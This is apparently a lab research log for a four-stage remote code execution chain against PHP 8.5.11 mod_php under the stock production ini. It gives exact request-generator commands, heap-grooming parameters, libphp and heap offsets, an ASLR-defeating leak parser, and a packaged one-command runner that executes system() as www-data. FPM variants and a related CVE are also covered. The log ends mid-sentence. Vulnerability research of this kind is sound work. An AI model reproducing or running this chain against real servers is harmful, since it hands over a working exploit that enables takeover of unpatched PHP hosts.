# PHP2Shell 8.5.11 — display_errors=Off chain research log

Last updated: 2026-10-26. Lab only.

## Target and environment

- Container `p2s-8511-off`: PHP 8.5.11 mod_php (`/usr/lib/apache2/modules/libphp.so`),
  Apache prefork, single worker via `gdb -q -batch -x /tmp/ps*.gdb` (`apache2 -f /tmp/httpd.conf -X`).
- Mounted ini `lab/php-off.ini`: `display_errors=Off`, `display_startup_errors=Off`,
  `output_buffering=4096`, `memory_limit=128M`, `post_max_size=8M`,
  `max_input_vars=1000`, `session.upload_progress.enabled=On`, `.cleanup=On`,
  `session.use_strict_mode=0`, `session.use_cookies=1`.
- Client: `/tmp/p2s-9bie/pure/mk_a1.py` + `chunked_send.py` (reference A generator),
  `/tmp/p2s/client/p2s.php` (`get|a1|b1`), `tools/off_b1b.php` (B generator).
- Probes:
  - `/tmp/ps.gdb`: break `php_session_reset_id` -> prints `send_cookie`, bin-128 free list
    length, chunk free-page sum, id/md page (masked 0x1FFFFF); break `zend_mm_safe_error`
    -> `OOM send_cookie=N` + bt.
  - `/tmp/ps2.gdb`, `/tmp/ps5.gdb`, `/tmp/ps6.gdb`: break `php_session_initialize` ->
    full `PS(id)`/`PS(mod_data)` addresses, fake-header len/first byte; `ps6` also prints
    the OOM pc (`libphp_base = pc - 0x1c3a90`).

## Verified working

### 1. On-chain 8.5.11 RCE (earlier, unchanged)
`display_errors=On`, 8M lab: full A1->B1 (leak)->A2->B2 chain executes `system("id")`
with ASLR defeated via HashTable `pDestructor` leak.

### 2. Off 8.5.11 OOB read (display_errors=Off, 128M) — WORKS
A:
```
mk_a1.py --out /tmp/a1-ref.bin --progress-len=4060
chunked_send.py --port=8091 --body-file /tmp/a1-ref.bin \
  --path '/index.php?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v'
```
Observed at the reset:
```
STATE send_cookie=1 bin128=0 free_pages=0 idpage=0x1fe000 mdpage=0x57230
OOM send_cookie=1            # php_url_encode inside php_session_reset_id
```
Child survives; HTTP 500.

B (no session cookie is sent by the client; the A's stale `PS(id)`/`send_cookie=1`/
`mod_data` persist into B):
```
off_b1b.php 8091 14 0x1fe 0x800 0x1018 0
off_b1b.php 8091 14 0x1fe 0x40000 0x1018 900
```
Both return `HTTP/1.1 200 OK`; `Set-Cookie` decodes to 2048 and 262144 bytes,
head `/01BBBBB...`. The md stays in the main chunk, the close is safe.

### 3. Cross-request primitive confirmed in 8.5.11
OOM stack:
```
php_hash_environment -> zend_activate_auto_globals -> php_auto_globals_create_post
-> php_default_treat_data -> sapi_handle_post -> rfc1867_post_handler
-> php_session_rfc1867_callback -> php_session_initialize -> php_session_reset_id
```
POST parsing happens **before** `zend_activate_modules()`, so the failed startup leaves
`PG(modules_activated)=0`; module RSHUTDOWN (session globals free) is skipped.
`INIT` probe in B prints the A's `PS(id)`, `send_cookie=1`, and `PS(mod_data)`.

### 4. Safe-close condition (learned the hard way)
`PS_OPEN_FUNC(files)` always `ecalloc`s a new `ps_files`, then calls
`ps_close_files(mod_data)` on the previous one. If the B forge value covers the stale
`ps_files`, its `last_key` becomes `0x4141...` and `ps_close_files` SIGSEGVs at
`testb $0x40,0x4(%rdi)` (child dies, response lost). Keep the md **outside the forged
chunk**; with the `mk_a1` A the md is in the main chunk at page 0x57 and nf=14 survives.

## Heap-layout measurements (128M, this build)

- Reference A: id at page **0x1fe** (chunk's last-but-one), md at page **0x57** (main
  chunk), `bin128=0`, `free_pages=0`, OOM at `php_url_encode`, send survives.
- Leak window from 0x1fe covers the id chunk's last 2 pages + the next physical chunk
  (2 MB). The next chunk is fresh/zero with only chunk-header pointers (a `chunk+0x40`
  self/neighbour pointer and 2 MB-aligned bases). No HashTables / libphp pointers.
- `X:900` nested arrays and up to 10 pad fields do not land in the next physical chunk;
  they go to other cached chunks. Leak contains 0-3 pointers only.
- Query params (1-byte values): each 8-char name moves the md slot by +0x50
  (`mdpage` 0x570a0 -> 0x57460) but does not move the id page.
- `--big` sweep (progress 4060): 72 -> id 0x1ff, free 24; 74 -> 0x1ec, free 16;
  76 -> 0x1e3, free 8; 78 -> 0x1fe, free 0, url_encode OOM (send=1); 80 -> parse OOM.
- Adding burners to zero the free pages pushes the id back to 0x1fe: free pages and id
  page are coupled through the bin-64 page creation at the END init.
- **early64** (one 39-byte value immediately after PHPSESSID) + progress 4030-4050,
  big 78: id moves into the **main chunk page 0x6b**, md stays main page 0x57, but the
  reset's send succeeds (`send_cookie` cleared) -> B sees `send=0`. This reproduces the
  reference's 8M `N64E` effect at 128M.
- Attempts to empty the last 128-bin slot at that state: extra `fillers128` (15/16),
  103-byte GET key, 103-byte headers, pre-tail/tail bins — all either OOM during parsing
  (`php_sapi_filter`) or still leave `bin128=1`. The A sits on a parse-memory ridge: an
  extra ~130 B at parse time moves the OOM before the reset; compensation must happen
  in the parse phase (e.g. nested `key_pad`), not in the trailing progress field.

## Reference pure 128M chain (9bie repo)

- `/tmp/p2s-9bie/pure`: claims full Off chain on `php:8.4.26-apache` with
  id page 0x137, `G:511` fills + `G:400` hole + `X:900` HashTables, leak of
  `zval_ptr_dtor` (libphp = value - 0x65EB60), stage 3 `S=main+0xF8398`,
  `zif=libphp+0x465370`, `hsv=main+0x7D720`.
- In this lab, `run_pure.sh --single` + `exploit.py --workers 1` failed 3/3 at B1
  ("no heap pointers" / "no Set-Cookie"). Not reproducible as shipped; needs the same
  calibration work as ours.

## Our 8.5.11 libphp offsets

```
zend_mm_safe_error 0x1c3a90
zif_system         0x5996e0
zval_ptr_dtor      0x7b47a0
```
Heap deltas are **not** stable across runs (main-id chunk: 0x800000 / 0x1600000 /
0x3400000; libphp-main: -0x3600000 / +0x1C00000), so heap-only base derivation is unsafe.
The leak's next-chunk `+0x40` pointer gives the next chunk base (= id_chunk+0x200000);
in one run another header pointer revealed the main chunk (0x...4800000) but no libphp.

## Next steps (ordered)

1. Empty the last 128-bin slot at the main-id (early64) A, without moving the OOM into
   parsing: compensate the parse-phase ridge (nested `--key-pad`) while adding one live
   bin-128 key (`--fillers128 15`). Target STATE: `send=1, bin128=0, free_pages=0,
   idpage=0x6b`, OOM `url_encode`.
2. If reached: B forge at page 0x6b with a value covering only pages 1..0x6b (md page
   0x136 untouched), fake_len ~0x80000; the read then covers the remaining main-chunk
   pages containing real HashTables; find the most frequent non-chunk qword =
   `zval_ptr_dtor` (libphp = qword - 0x7b47a0).
3. Stage 3: port `cheap_oom_a`/`fake_ref_b`/`mk_ht` to this container; measure `S`
   (main-relative) and `hsv` with gdb, use `zif_system = libphp + 0x5996e0`.
4. Alternative send-failure at the FILE_START A: make the 40-byte bin empty at the reset
   (reference `send_a_idmain` NS=20 15-byte headers) so the first `smart_str` allocation
   needs the last page and OOMs with `send_cookie=1`.

## Round 2 findings (same day)

### Bin table (Zend/zend_alloc_sizes.h, 8.5.11)
`index: size (slots/page)` — 4:40(102), 5:48(85), 6:56(73), 7:64(64),
11:128(32), 15:256(16), 19:512(8), 20:640(32). `free_slot[11]` in our probe is
correctly the 128 bin.
`ps_files` = 40 bytes (`last_key`, `basedir`, `dirdepth`, `st_size`, `filemode`, `fd`)
-> bin 40 (102 slots/page).

### END-cleanup semantics (ext/session/session.c 8.5.11)
`php_session_rfc1867_callback` MULTIPART_EVENT_END:
```
if (progress->sid && progress->key.s) {
    cleanup ? php_session_rfc1867_cleanup() : php_session_rfc1867_update();
    php_rshutdown_session_globals();      // frees PS(id), closes PS(mod_data)
}
```
Only a **bailout during the init** skips the rshutdown, which is why the A must OOM at
`php_url_encode` (send_cookie stays 1). Any A whose send succeeds leaves `PS(id)=NULL`
for the B (observed: progress-early A -> B INIT `id=nil send=0`).

### progress-early layout (important)
Moving `PHP_SESSION_UPLOAD_PROGRESS` **before** the big/burner fields (plain fields
after it, no file part) gives:
```
STATE send=1 bin128=0 free_pages=1 idpage=0xe9000 mdpage=0x57230
```
id mid-chunk (0xe9), md in main (0x57) -> the forge would be safe and the id chunk tail
is freed at request shutdown. But `create_sid` consumes one of the two free pages, the
`url_encode` (bin128 empty) takes the last, the send succeeds, and the END rshutdown
clears the state. Stable for progress 4040..4054; 4058+ OOMs at `php_sapi_filter`
(the progress-key smart_str crossing to 2 pages needs contiguity).
To finish the A: force `url_encode` to fail in this layout by leaving exactly one free
page before `create_sid` (it takes it) or by consuming the last page in
`php_session_send_cookie` before url_encode (empty bin 40 at the reset).

### Filename/bin experiments (all rejected)
- nested filenames 39 B (fn39 >= 24): non-empty filenames turn the nested parts into
  file uploads; memory pressure collapses (free_pages 308-487), layout lost.
- nested filenames 15 B: same collapse (free 308, id 0x164).
- GET value 39 B on the early64 control: id moves to 0x5c1 (main), free stays 1.
- GET 103 B key / extra filler128 / NS headers on the filelast A: parse OOM
  (`php_sapi_filter`/`smart_str`) before the reset; the parse ridge rejects ~130 B
  additions, and compensation must be in the parse phase.
- early64 (main-chunk id 0x6b) + md at 0x57: the forge for id 0x6b would overwrite the
  md page 0x57 (same main chunk) -> ps_close SIGSEGV. Main-id needs the md moved
  (query params only shift the slot within page 0x57, not the page).

### Current best A
`early64=1, key_pad=89, progress=4030..4054`: id main 0x6b, md 0x57, bin128=0,
free_pages=1, send succeeds -> state cleared at END. One page from the persistent
`send_cookie=1` state.

## Round 3 findings — closest A state to date

### Per-bin free lists at the reset (new probe /tmp/ps7.gdb)
Reports `send`, `free`, id/md page and free-list lengths for bins 4(40),5(48),6(56),
7(64),11(128),12(160). Example (progress-early A):
`send=1 free=1 id=0xe9 b4=58 b5=83 b6=29 b7=63 b11=0 b12=24`.
Bin 7 (64 B) has 64 slots/page; the id string is the only live slot on its page
(`b7=63`). Bin 11 (128 B, url_encode) is empty -> it creates a page from the free page.

### Best A (id exactly at the reference's 0x137)
```
mk_a1.py --progress-early --progress-len=4044 --post40=1 --big=78 --burners=19
GET: 5x q...=v + 8x g<N>=<15-byte v>
STATE send=1 free=3 id=0x137000 md=0x574b0 b4=2 b11=0
```
- `--progress-early`: progress field before the big fields; init still at END; id page
  0x137 and md in main (0x57) -> forge at 0x137 leaves pages 0x138..0x1ff free after
  the A's shutdown for the X HashTables, exactly the reference pure-chain layout.
- `--post40=1`: a plain field with a 15-byte value adds exactly two live bin-40 filter
  copies at the END (no new input vars beyond one POST field), dropping b4 from 18 to 2.
- 8 GET params with 15-byte values (`g0..g7`) drop b4 from 18 to 2 at K=8; K=9 creates
  a new bin-40 page instead (b4=102), K=10+ moves the id and/or OOMs.
- One fewer burner (`--burners=19`) was the compensation that kept the parse on the
  ridge while producing id 0x137.

### Remaining gap: free=3
The send path's page-needing allocations: `smart_str` "Set-Cookie: " (bin 40, b4=2
slots -> no page), `php_url_encode` (bin 128, empty -> one page), then the e_id append
realloc (bin 160, 24 slots) and the SAPI header copy. With free=3, url_encode succeeds.
Needed for the persistent state: free=0 at the reset (then url_encode OOMs, send stays
1) OR empty b4/b5/b12 so the chain of page allocations consumes the three pages and the
allocation after url_encode fails with send=1.
- Adding progress pages (pl 4072/4096/5000/8160) OOMs at the parse before the END.
- Extra GET params (K>=9) create a new bin-40 page and lose the layout.
- `--post40=2+`, extra tail/burner pressure: parse OOM at `php_sapi_filter`.
- The parse-memory ridge rejects any ~80-130 B early addition; compensation must come
  from the same phase. The current optimum (post40=1, burners=19, big=78) sits on it.

### Next experiments (concrete)
1. Consume the 3 free pages inside `php_session_send_cookie`: empty b4 (2 slots) and b5
   (83) / b12 (24) with live strings from existing input vars; the post40 field(s) are
   the bin-40 lever, GET values the budget-limited lever. Target b4=0 with free=3 so the
   smart_str page + url_encode page + append page chain fails after url_encode.
2. Add 3 live pages at the END without parse OOM: a 4000-byte file-part `type` (1 live
   page) + a 4000-byte POST key (1 page) + a 4000-byte filename (2 pages, but $_FILES
   copies cost 2) -> tune to exactly 3 pages; check id stays 0x137.
3. If free=0 with id 0x137: B = `off_b1b.php 8091 <nf> 0x137 <fake_len> 0x1018 900`
   with a *partial* forge (pages 0x137, not 511) so pages 0x138..0x1ff stay free for
   X:900; fake_len 0x110000 covers to page 0x1f7. Scan for the most frequent non-chunk
   qword -> `zval_ptr_dtor`, libphp = qword - 0x7b47a0.
4. Stage 3: measure S/hsv on this container; `zif_system = libphp + 0x5996e0`.

## Round 4 — BREAKTHROUGH: reference A state reproduced on 8.5.11

### The A (verified alone, child survives)
```
mk_a1.py --out /tmp/a1-ct.bin --progress-early --progress-len=4044 \
  --post40=1 --big=78 --burners=19 --cttail=4000 --sid-late
GET: /index.php?q0000000=v&...&q0000004=v&g0=<15v>&...&g7=<15v>
chunked_send.py --port=8091 --body-file /tmp/a1-ct.bin --path '<above>'
```
Observed:
```
STATE send_cookie=1 bin128=0 free_pages=0 idpage=0x137000 mdpage=0x57f50
OOM send_cookie=1            # php_url_encode inside php_session_reset_id
HTTP 500; worker alive (200)
```
This is the reference pure-chain A geometry on 8.5.11: id at page 0x137 (mid-chunk),
md in the main chunk (0x57), no free pages, 128-bin empty, persistent `send_cookie=1`.

Construction notes:
- `--progress-early`: progress before the big fields -> init at END with the id page
  created mid-chunk.
- `--post40=1`: plain field with a 15-byte value -> two live bin-40 copies (b4 18->2).
- 8 GET params with 15-byte values (`g0..g7`): bin-40 drain in the GET phase.
- `--burners=19`: the compensation that keeps the parse on the ridge while the id
  lands at 0x137 and free reaches 0.
- `--cttail=4000`: trailing file part with a 4000-byte Content-Type (1 live page).
- `--sid-late`: PHPSESSID POST field after the file part, so the file's FILE_START
  skips the init; the END event initializes with the stale globals.
- `--longname` (4000-byte POST key) is NOT usable: opcache
  `accel_init_interned_string_for_php` OOMs on interning a long key.
- A 4000-byte cookie value alone did not reproduce the state; the CT body did.

### B calibration in progress
`off_b1b.php` gained an 8th arg: forge page-count `$fp` (value length fp*4096-25, fake
header at `$page`), so the forge can cover only pages 1..0x137 and leave 0x138..0x1ff
free for X:900.
B call: `off_b1b.php 8091 <nf> 0x137 0xC8000 0x1018 900 0 0x137`
B INIT observations vs nf: nf=4..14 -> id=0x...937000 len=32 (real id, forge missed);
nf=16 -> len='BBBBBBBB' (a 511-page B flood landed on the id page instead of the forge).
The forge must be the field landing in the id chunk; nf=15 (and the pad/order) is the
next candidate. When the forge lands: INIT len=0xC8000 b0=0x2f ('/'), then the
`url_encode` sends 0xC8000 bytes from the id page through the X HashTables.

## Round 5 — forge placement at 0x137 SOLVED

B filler/forge calibration for the new A (id page 0x137):
```
off_b1b.php 8091 14 0x137 0xC8000 0x1018 <xc> 0 400
```
`nf=14` plain 511-page fills + a **400-page** partial forge whose fake header is at page
0x137. B INIT observed:
```
INIT id=0x...937000 len=819200 (=0xC8000) b0=2f ('/') send=1 mod=<main 0x57...>
```
So the partial 400-page value lands in the id chunk (Best-Fit), pages 0x191..0x1ff stay
free for the X arrays, and the stale `PS(id)` sees the fake header.
- `$fp=0x137` (311-page) forge missed (Best-Fit chose another chunk); `$fp=400` landed.
- `nf=15/16` -> a 511-page B flood lands on the id page instead (len='BBBB...').
- With xc=0 and fake_len=0xC8000 the response was 1 byte: the B's `url_encode` needs
  3*0xC8000 = 2.4 MB = 576 pages and likely exceeds the B's free pages (A left free=0).
Next: with the STATE probe read the B reset free/bin128, then lower fake_len to
0x40000..0x80000 so the send fits; run xc=900 and scan the cookie for HashTable
pDestructor pointers (`zval_ptr_dtor`, libphp = qword - 0x7b47a0).

## Round 6 — Off leak STAGE COMPLETE: libphp leaked, main still missing

### Working Off leak (A + B), 8.5.11, display_errors=Off, 128M
A: `/tmp/a1-ct.bin` (Round 4) + 5x `q...=v` + 8x `g<N>=<15-byte v>` GETs.
B: `off_b1b.php 8091 14 0x137 0x80000 0x1018 900 0 400 0` (args: nf, page, leak,
   dataOff, xc, pad, forge-pages, n_231fields).
Observed:
```
STATE send=1 bin128=31 free_pages=207 id=0x137000 md=0x56050
COOKIE=524288 pointers=2898
top qword 0x...9b47a0 x292   -> libphp = qword - 0x7b47a0   (zval_ptr_dtor)
```
The 900 nested arrays land in the id chunk's freed tail pages (0x138..0x1ff); their
HashTable `pDestructor` = `zval_ptr_dtor` appears hundreds of times. libphp base is
recovered. `0xA0000` read also works (655360-byte cookie, 5555 pointers, 657 hits).

### Main chunk base is NOT in the leak
- The leak's pointers cluster into exactly three 2 MB buckets:
  id chunk (largest, ~2600), a libphp cluster (~365, the zval_ptr_dtor values), and one
  "spill" heap chunk (~40-75).
- gdb comparison (ps6 INIT `mod`): main chunk = `mod & ~0x1FFFFF`; it never matches any
  leak bucket. The spill chunk sits `0x7E00000` or `0xAE00000` below main, varying run to
  run (24-chunk difference) -> not a usable delta.
- X:900 with 200/80/0 pre-231B fields, and pad walks 0/4/8/12, never reference main.
  The nested arrays' buckets/HT structs go to the id-chunk holes and one spill chunk.
- The read cannot reach the next chunk's header (chunk-list pointer to main): fake_len
  needed ~0xC9000, url_encode 2.4 MB > 2 MB large-allocation limit, and the B's
  real_size is at the 128M limit -> huge allocation refused (0xC8000 -> resp=1).
- Fixed deltas main-id_chunk also unstable (0x400000 / 0x600000 / 0x1600000).

### Tried for main, failed
- Removing the 200 survival fields (n231=0/80): leak still 3 buckets, no main.
- Pads between the partial forge and X (0/4/8/12): spill chunk moves, never main.
- Main-id A via early64 + CT pressure: would put the id in main page 0x6b, but the md
  sits at 0x57 (same main chunk) inside the forge's pages -> `ps_close_files` crash.
  Moving the md above the id page or making the forge not cover it is unresolved.
- The id string's slot cannot be reused by a small raw buffer: PS(id) remains a live
  leaked allocation after the url_encode bailout (the request rshutdown is skipped).

### State of the chain
- On 8.5.11 (display_errors=On, 8M): full A1->B1->A2->B2 RCE already verified.
- Off 8.5.11 (display_errors=Off, 128M): persistent A primitive + libphp OOB leak
  verified. Missing: main chunk base for stage 3 (`S = main + off`, `hsv = main + off`).
  zif_system = libphp + 0x5996e0 is already known; the A2/B2 shapes from the On chain
  can be ported once main is known.
### Next main-base ideas
1. Get some of the X:900 HashTable structs (not just buckets) allocated in the main
   chunk so a parent bucket in the id chunk points to main. Requires main to have whole
   free pages at X time; try pre-filling the chunk list differently (post-forge full
   fields count 1-3, not 4+) and scan all buckets.
2. Move the A's id into main while keeping the md outside the forge's page range
   (e.g., make the ps_files bin-40 page land above the id page), then leak main directly.
3. Build the leak B against the 8M heap of the On chain (where the reference's X:900
   produced a main cluster) and derive the exact conditions, then reproduce at 128M.

## Round 7 — FULL display_errors=Off RCE (8.5.11, 128M) — 4/4

### Chain (single prefork worker, all HTTP; no target-side files/gdb)
1. **A1** (`/tmp/a1-ct.bin`, chunked):
   `mk_a1.py --progress-early --progress-len=4044 --post40=1 --big=78
    --burners=19 --cttail=4000 --sid-late`
   GET path: `q0000000..4=v` + `g0..g7=` 15-byte values.
   → HTTP 500; `send_cookie=1`, `PS(id)` stale at page 0x137, md in main,
   `bin128=0`, `free_pages=0`; url_encode OOM; worker survives.
2. **B1** (`tools/off_b1b.php 8091 14 0x137 0xC8000 0x1018 300 0 400 0`, chunked):
   partial 400-page forge lands on 0x137 (`len=0xC8000`, data `/01B...`), 900→300
   nested arrays fill the freed tail. HTTP 200, 819200-byte Set-Cookie.
   Parse:
   - `zl` = most frequent qword with low 12 bits 0x7a0 -> `libphp = zl - 0x7b47a0`.
   - buckets by `q & ~0x1FFFFF`; skip the largest (id chunk) and the `zl` bucket;
     the next bucket with count >= 50 and `|b - libphp| < 0x4000000` is **main**
     (observed: main cluster x707).
3. **A2** (`cheap_oom_a.py --port 8091 --parts 880 --depth 64 --fillers 115`):
   HTTP 500 cheap OOM. Leaves `PS(http_session_vars)` as an IS_REFERENCE
   (`ps_globals+0x168` -> reference struct) at **hsv = main + 0x7c720** (stable 4/4).
4. **B2** (`/tmp/stage3_off.php` = On-chain A2/B2 code):
   `fake_ref_b`: n1=500, n2=495, vl=384, rc=1, ptr=S; `mk_ht` at S.
   **S = hsv + 0x7AC78 = main + 0xF7398**; `zif = libphp + 0x5996e0`.
   The n1 spray lands exactly on hsv (gdb: `01 00 00 00 0a ... ptr=S ... 0x107`),
   B2 track_init dtor -> fake zend_array at S -> `pDestructor=zif_system` ->
   `system(cmd)`. B2 response is empty/crashes after the call (expected); proof file
   must be on a www-data-writable path (`/tmp`, not `/out` in this lab).

### Verified
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` 4/4 across fresh workers,
with different ASLR (main/libphp parsed per run). Offsets used on this build:
`zval_ptr_dtor=libphp+0x7b47a0`, `zif_system=libphp+0x5996e0`,
`hsv=main+0x7c720`, `S=main+0xF7398`.
Why the On-chain's S=main+0xF5398 missed: our A2's hsv is +0x2000; the invariant
`S - hsv = 0x7AC78` holds across both versions, giving our S.

### Reproduce (lab)
- one worker: `gdb -q -batch -x /tmp/ps10.gdb` (apache2 -X) or a single-worker MPM;
- A1: chunked_send of /tmp/a1-ct.bin with the GET path above;
- B1: off_b1b.php as above; parse main/libphp; 
- A2: cheap_oom_a.py (880/64/115);
- B2: `php /tmp/stage3_off.php 8091 <main+0x2000> <libphp> 'id>/tmp/off_proof'`;
- check `/tmp/off_proof`.

### Risk assessment
php2shell is real and exploitable on mod_php 8.5.11 under the stock production
posture (`display_errors=Off`, `memory_limit=128M`) with a single live worker:
ASLR is defeated by the forged-zend_string OOB read (libphp + main recovered),
and the write primitive reaches `system()` via a fake HashTable pDestructor.
No target-side file access, display_errors, or custom ini is needed (only a trailing
4000-byte content-type and multi-megabyte chunked bodies).

FPM precision (verified in 8.5.11): it is the failed request startup, not the OOM
signal, that removes the stale state. The POST parse at `main/main.c:1942` runs
inside `php_request_startup()`; the OOM is caught by its `zend_catch` and returned
as FAILURE. PHP-FPM's handler then calls `fcgi_finish_request`,
`php_module_shutdown()` and returns `FPM_EXIT_SOFTWARE`
(`sapi/fpm/fpm/fpm_main.c:1838-1843`), so the worker exits and the master forks a
replacement. Apache mod_php instead `zend_bailout()`s the failed request inside
`zend_first_try` (`sapi/apache2handler/sapi_apache2.c:672-674`); the child keeps
serving and, because `modules_activated=0`, the session RSHUTDOWN is skipped, so
the globals survive. If an OOM happened after startup, FPM would survive, but the
normal request shutdown would clear the session globals, so the chain still would
not persist.

## Packaging (off_chain/)

The chain is packaged in `off_chain/` with a one-command runner and a standalone
README (`off_chain/README.md`): A1 generator, B1 generator, leak parser, A2/B2
stage-3 client, offsets, evidence, risk notes.

Verified from the package on a plain single-process worker (no gdb):
```
docker exec -d p2s-8511-off apache2 -f /tmp/httpd.conf -X
CONTAINER=p2s-8511-off ./off_chain/run_off_chain.sh 8091 /tmp/off_proof
# [1/4]..[4/4] RCE OK
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
The `CONTAINER` variable makes the runner read the target-side proof via
`docker exec`; without it the proof path is checked on the local filesystem.
`/out` is not writable by www-data in this lab; `/tmp` is. The B2 request's
response is empty and the worker may exit after `system()` — the proof file is
the success criterion.


## Round 9 — verified on the exact stock php.ini-production (3/3)

The lab's php.ini was replaced with the byte-identical stock
`/usr/local/etc/php/php.ini-production`: display_errors=Off,
display_startup_errors=Off, memory_limit=128M, output_buffering=4096,
post_max_size=8M, upload_max_filesize=2M, session.use_strict_mode=0, session
upload-progress defaults On. Chain result: RCE OK 3/3
(`uid=33(www-data)`), different ASLR bases.

So the earlier lab ini was not needed. Its differences from production were
cosmetic: `error_reporting=E_ALL` vs `E_ALL & ~E_DEPRECATED`, explicit
`session.save_path="/tmp"` vs the default temp dir, explicit
`session.upload_progress.* = On` vs the defaults, and an inert
`max_memory_limit=-1` directive. None affect the chain.

Remaining lab deviation: Apache runs one worker
(ServerLimit/StartServers/MaxRequestWorkers 1 plus `apache2 -X`). The exploit
needs the four requests on one persistent mod_php child. On a stock prefork
target the attacker must pin a child by holding `MaxRequestWorkers-1` partial
POSTs (the reference's technique); that is attacker-side and not a target config
change, but it has not been re-validated here with the 8.5.11 chain. No
application code is involved (the endpoint is `<?php echo "OK\n";`). The target
PHP build is the stock vulnerable 8.5.11; fixed releases close the bug.


## Trigger scope (upload_progress)

This chain needs `session.upload_progress.enabled=On`, the stock default (`1` at
`ext/session/session.c:935`). The multipart callback gates on it
(`ext/session/session.c:3186`); with it off no session initializes before module
activation, so A1 has no stale `PS(id)` to build on.

Claims of code execution with upload progress disabled refer to other triggers in
the same advisory family, not this four-stage chain:

- the separate multipart/`$_POST` hash-table path (partial Bucket in
  `php_register_variable_ex` destroyed by the mod_php request cleanup), which needs
  no sessions and is not reproduced here;
- `session.auto_start=1` (default `0` at `ext/session/session.c:910`), which runs
  `php_session_start()` in the module RINIT (`php_rinit_session`); an OOM there also
  leaves `modules_activated=0`, so the same dangling-globals pattern could have a
  non-upload-progress trigger. Not tested.

## Path 1 — parser/hash-table partial bucket (no sessions)

Reproduced the vulnerable state without PHPSESSID or any session field, using the
A1-shaped nested records plus a final long-segment field:

```
python3 off_chain/mk_a1_off.py --out /tmp/p1.bin --no-sid --progress-early \
  --progress-len=4044 --post40=1 --big=78 --burners=18 --cttail=4000 \
  --longseg=4000 --longval=1000
# GET: q0000000..4=v plus g0..g7=<15-byte values>
# send chunked to /index.php
```

Observed OOM (POST parsing, before module activation):
```
zend_mm_alloc_large
  <- zend_hash_str_update_ind
    <- php_register_variable_ex
      <- php_sapi_filter
        <- rfc1867_post_handler
          <- sapi_handle_post <- php_default_treat_data
            <- php_auto_globals_create_post <- zend_activate_auto_globals
              <- php_hash_environment <- php_request_startup
```
The failing allocation is the 4000-byte key for `files[L...][a]` inside
`_zend_hash_str_add_or_update_i` (inlined into `zend_hash_str_update_ind`). The
target HashTable was the freshly created `$_POST['files']` array:
`nNumUsed` went 0 -> 1 and `nNumOfElements` 0 -> 1 before `zend_string_init` failed,
so bucket 0 is visible to teardown but uninitialized. This is the ordering the Calif
write-up describes (count before key allocation).

Neighbouring OOM sites seen while tuning:
- `zend_hash_real_init_mixed` (a new array's bucket area): the table stays
  uninitialized, no partial bucket, worker survives.
- `zend_hash_do_resize` (a table grows): the resize allocation fails before the
  insert, table stays valid, worker survives.
The key-allocation site above requires the heap shape with the long segment; it is
the one that leaves the malformed table. In this run the stale bucket bytes were
benign and the mod_php request shutdown destroyed the table without a crash.

Remaining work for impact: groom the uninitialized bucket slot (the new array's
arData comes from a bin-256 slot; a freed 231-byte multipart raw buffer can seed it
with controlled bytes) and keep the top-level `$_POST` key count below the next
table resize, so the resize OOM does not fire first. Then `zend_array_destroy`
interprets the bucket's key/val; the Calif write-up reports RCE on mod_php from
this path. Not reached here; the trigger and vulnerable state are reproduced.

## Path 2 — session.auto_start=1 (no upload_progress)

`session.auto_start=1` (default 0, `PHP_INI_PERDIR`) makes the session RINIT call
`php_session_start()` (`php_rinit_session`, ext/session/session.c:2861-2899). An OOM
inside that RINIT leaves `PG(modules_activated)=0` (it is set only after
`zend_activate_modules()` returns, main/main.c:1943-1944), so the session RSHUTDOWN
is skipped and `PS(id)`/`PS(mod_data)`/`PS(http_session_vars)` persist.

But the next request's session RINIT first calls `php_rinit_session_globals()`
(session.c:2861-2865), which sets `PS(id)=NULL`, `PS(mod_data)=NULL`, and
`ZVAL_UNDEF(PS(http_session_vars))`, before any session code runs. Without upload
progress there is no session consumer before that reset: the RFC1867 callback is
gated off (`session.c:3186`), and no other stock path touches session globals
pre-RINIT. The dangling state is cleared before it can be used. `auto_start` is also
not attacker-settable and off by default.

Conclusion: auto_start creates stale session state but does not provide the
pre-RINIT consumer that the four-stage chain needs. The upload-progress hook remains
the only stock consumer; a different pre-RINIT consumer would be required to turn
auto_start into a usable trigger.

## Round 10 — FPM: stale unserializer state reproduced, worker SIGSEGV 5/5

The FPM path does not use the mod_php startup-failure primitive. It uses the
second CVE in the family (CVE-2026-109619): the generic unserializer's bookkeeping
is published in `BG(unserialize)` (Basic globals) and only reset in
`PHP_RINIT(basic)`, which runs *after* `php_hash_environment()`.

### Mechanism (8.5.11)

- `php_var_unserialize_init()`: `BG(unserialize).data = emalloc(0x2018)`,
  `BG(unserialize).level = 1`. Normal completion calls
  `php_var_unserialize_destroy()`, which clears `.data` and drops `.level` to 0.
- A fatal inside a decode skips destroy. If the fatal happens **after** request
  startup succeeded (application-level `session_start()`/`unserialize()`), FPM
  keeps the worker; the request heap is freed and the globals go stale.
- Next multipart request: rfc1867 `FILE_START` calls `php_session_rfc1867_update()`
  -> `php_session_initialize()` -> `ps_srlzr_decode_php()` -> init sees `level=1`
  and returns the dangling `d`. This is inside `php_hash_environment()`, before
  Basic's RINIT memsets the globals.
- Fix `31c0ea7d7ff` (8.5.12) adds `php_basic_early_rinit()`, called from
  `php_request_startup()` before request data is processed, which memsets
  `BG(serialize)`/`BG(unserialize)`.

### Working trigger (stock 8.5.11 FPM, one worker)

- S1: `fpm_sess.php` writes `$_SESSION['p']` = 100000-int array (1.19 MB record).
- A: `fpm_sess_oom.php` (`ini_set('memory_limit','4M'); session_start();`) with
  S1. The decode OOMs at `zend_hash_real_init_mixed`; `php_session_decode`'s
  catch re-bails; worker survives.
- B: multipart POST with a different `PHPSESSID` (S2, one int) plus
  `PHP_SESSION_UPLOAD_PROGRESS` and 16 file parts with 4096-byte names. The
  session decode at `FILE_START` reuses the stale `d`.

Probe offsets on the official `php:8.5.11-fpm` binary:
`basic_globals+0x350` serialize_lock, `+0x368` unserialize.data, `+0x370`
unserialize.level; `sizeof(php_unserialize_data)=0x2018` (3 pages),
`sizeof(var_dtor_entries)=0x1000` (2 pages). `fpm/probe-unser.gdb` follows the
pool child and logs the state.

Observed:

```
BAILOUT level=1 data=0x...a7f000 dtor=0x...a82000 used=1
INIT lock=0 level=1 data=0x...a7f000
    last=0x...a7f038 first_dtor=last_dtor=0x...a82000
```

`d` and the dtor block are allocated back-to-back (`d + 0x3000`); both are freed
at shutdown and coalesce. The 4096-byte file-part names are materialized as
`zend_string`s (`$_FILES[...]['name']`) and, in the crashing runs, land at `d`:

```
